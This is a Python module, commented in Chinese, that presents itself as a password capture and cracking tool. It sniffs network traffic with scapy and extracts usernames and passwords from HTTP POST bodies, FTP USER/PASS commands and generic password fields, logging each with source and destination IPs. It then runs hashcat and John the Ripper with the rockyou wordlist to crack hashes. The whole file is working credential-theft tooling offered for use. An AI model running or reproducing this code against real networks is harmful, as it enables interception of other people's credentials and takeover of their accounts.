#!/usr/bin/env python3
"""
密碼捕獲和破解模組
捕獲網路中的密碼雜湊，並使用工具進行破解
"""

import subprocess
import hashlib
import re
import urllib.parse
from scapy.all import sniff, IP, TCP, Raw, get_if_list
import threading
import time

class PasswordCapture:
    def __init__(self):
        """初始化密碼捕獲器"""
        self.capturing = False
        self.captured_passwords = []
        self.captured_hashes = []
        self.capture_thread = None
        self.interface = None
    
    def _capture_packets(self, interface=None):
        """捕獲資料包並提取密碼"""
        def process_packet(packet):
            if not self.capturing:
                return
            
            if packet.haslayer(Raw) and packet.haslayer(IP) and packet.haslayer(TCP):
                try:
                    load = packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # 檢測HTTP POST請求中的密碼
                    if 'POST' in load and ('password' in load.lower() or 'passwd' in load.lower() or 'login' in load.lower()):
                        self._extract_http_credentials(load, packet)
                    
                    # 檢測FTP密碼
                    if ('USER' in load or 'PASS' in load) and ('220' in load or '331' in load or '230' in load):
                        self._extract_ftp_credentials(load, packet)
                    
                    # 檢測其他協定的憑證
                    self._extract_generic_credentials(load, packet)
                except Exception as e:
                    pass
        
        try:
            if interface:
                sniff(iface=interface, prn=process_packet, stop_filter=lambda x: not self.capturing, store=False)
            else:
                sniff(prn=process_packet, stop_filter=lambda x: not self.capturing, store=False)
        except Exception as e:
            print(f"[!] 密碼捕獲錯誤: {e}")
    
    def _extract_http_credentials(self, data, packet):
        """從HTTP資料中提取憑證"""
        try:
            # 提取URL編碼的資料
            if '\r\n\r\n' in data:
                body = data.split('\r\n\r\n', 1)[1]
            else:
                body = data
            
            # 嘗試解析URL編碼的資料
            try:
                parsed = urllib.parse.parse_qs(body)
                username = None
                password = None
                
                for key in ['user', 'username', 'email', 'login', 'userid', 'account']:
                    if key in parsed:
                        username = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                for key in ['password', 'passwd', 'pass', 'pwd']:
                    if key in parsed:
                        password = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                if username or password:
                    credential = {
                        'type': 'HTTP',
                        'username': username or "N/A",
                        'password': password or "N/A",
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_passwords:
                        self.captured_passwords.append(credential)
                        print(f"[+] 捕獲HTTP憑證: {credential['username']} / {credential['password']} (來源: {credential['source_ip']})")
            except:
                # 如果解析失敗，使用正則表達式
                username_match = re.search(r'(?:user|username|email|login|userid|account)=([^&\s\r\n]+)', data, re.IGNORECASE)
                password_match = re.search(r'(?:password|passwd|pass|pwd)=([^&\s\r\n]+)', data, re.IGNORECASE)
                
                if username_match or password_match:
                    username = urllib.parse.unquote(username_match.group(1)) if username_match else "N/A"
                    password = urllib.parse.unquote(password_match.group(1)) if password_match else "N/A"
                    
                    credential = {
                        'type': 'HTTP',
                        'username': username,
                        'password': password,
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_passwords:
                        self.captured_passwords.append(credential)
                        print(f"[+] 捕獲HTTP憑證: {username} / {password} (來源: {credential['source_ip']})")
        except Exception as e:
            pass
    
    def _extract_ftp_credentials(self, data, packet):
        """從FTP資料中提取憑證"""
        try:
            if 'USER ' in data:
                username = data.split('USER ')[1].split('\r\n')[0].strip()
                credential = {
                    'type': 'FTP',
                    'username': username,
                    'password': None,
                    'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                    'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                    'timestamp': time.time()
                }
                # 檢查是否已有相同的FTP使用者名
                existing = None
                for cred in self.captured_passwords:
                    if cred['type'] == 'FTP' and cred['username'] == username and cred['password'] is None:
                        existing = cred
                        break
                
                if not existing:
                    self.captured_passwords.append(credential)
            
            if 'PASS ' in data:
                password = data.split('PASS ')[1].split('\r\n')[0].strip()
                # 找到最近的FTP憑證並添加密碼
                for cred in reversed(self.captured_passwords):
                    if cred['type'] == 'FTP' and cred['password'] is None:
                        cred['password'] = password
                        print(f"[+] 捕獲FTP憑證: {cred['username']} / {password} (來源: {cred['source_ip']})")
                        break
        except Exception as e:
            pass
    
    def _extract_generic_credentials(self, data, packet):
        """提取通用格式的憑證"""
        try:
            # 檢測各種常見的憑證格式
            patterns = [
                r'password["\']?\s*[:=]\s*["\']?([^"\'\s\r\n]+)',
                r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s\r\n]+)',
                r'pass["\']?\s*[:=]\s*["\']?([^"\'\s\r\n]+)',
            ]
            
            for pattern in patterns:
                matches = re.finditer(pattern, data, re.IGNORECASE)
                for match in matches:
                    password = match.group(1)
                    if len(password) > 3:  # 過濾太短的匹配
                        credential = {
                            'type': 'Generic',
                            'username': 'N/A',
                            'password': password,
                            'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                            'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                            'timestamp': time.time()
                        }
                        
                        if credential not in self.captured_passwords:
                            self.captured_passwords.append(credential)
        except Exception as e:
            pass
    
    def start(self, interface=None):
        """開始捕獲密碼"""
        if self.capturing:
            return False
        
        try:
            # 如果沒有指定介面，嘗試獲取預設介面
            if not interface:
                interfaces = get_if_list()
                non_loopback = [iface for iface in interfaces if not iface.startswith('lo')]
                if non_loopback:
                    interface = non_loopback[0]
                else:
                    interface = None
            
            self.interface = interface
            self.capturing = True
            self.captured_passwords = []  # 重置捕獲的密碼
            
            self.capture_thread = threading.Thread(target=self._capture_packets, args=(interface,), daemon=True)
            self.capture_thread.start()
            
            if interface:
                print(f"[+] 密碼捕獲已啟動 (介面: {interface})")
            else:
                print(f"[+] 密碼捕獲已啟動 (所有介面)")
            print("[*] 正在監聽網路流量以捕獲密碼...")
            return True
        except Exception as e:
            print(f"[!] 啟動密碼捕獲錯誤: {e}")
            self.capturing = False
            return False
    
    def stop(self):
        """停止捕獲密碼"""
        if not self.capturing:
            return False
        
        self.capturing = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
        print("[+] 密碼捕獲已停止")
        print(f"[*] 總共捕獲 {len(self.captured_passwords)} 組密碼")
        return True
    
    def get_captured_passwords(self):
        """獲取捕獲的密碼"""
        return self.captured_passwords
    
    def crack_hash(self, hash_value, hash_type='md5', wordlist='/usr/share/wordlists/rockyou.txt'):
        """
        使用hashcat或John the Ripper破解雜湊
        
        Args:
            hash_value: 要破解的雜湊值
            hash_type: 雜湊類型 (md5, sha1, sha256, etc.)
            wordlist: 字典檔案路徑
        """
        print(f"[*] 嘗試破解雜湊: {hash_value} (類型: {hash_type})")
        
        # 嘗試使用hashcat
        try:
            hashcat_cmd = [
                'hashcat',
                '-m', self._get_hashcat_mode(hash_type),
                hash_value,
                wordlist,
                '--force'  # 在某些系統上可能需要
            ]
            
            result = subprocess.run(hashcat_cmd, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                # 解析hashcat輸出
                for line in result.stdout.split('\n'):
                    if hash_value in line and ':' in line:
                        cracked = line.split(':')[-1]
                        print(f"[+] 破解成功: {cracked}")
                        return cracked
        except Exception as e:
            print(f"Hashcat錯誤: {e}")
        
        # 嘗試使用John the Ripper
        try:
            # 建立暫存檔案
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.hash') as f:
                f.write(f"{hash_value}\n")
                temp_file = f.name
            
            john_cmd = ['john', '--wordlist=' + wordlist, temp_file]
            result = subprocess.run(john_cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0 or 'password' in result.stdout.lower():
                # 嘗試顯示破解結果
                show_cmd = ['john', '--show', temp_file]
                show_result = subprocess.run(show_cmd, capture_output=True, text=True)
                if show_result.returncode == 0:
                    print(f"[+] 破解結果: {show_result.stdout}")
            
            import os
            os.unlink(temp_file)
        except Exception as e:
            print(f"John the Ripper錯誤: {e}")
        
        return None
    
    def _get_hashcat_mode(self, hash_type):
        """獲取hashcat模式代碼"""
        modes = {
            'md5': '0',
            'sha1': '100',
            'sha256': '1400',
            'sha512': '1700',
            'ntlm': '1000',
            'bcrypt': '3200'
        }
        return modes.get(hash_type.lower(), '0')

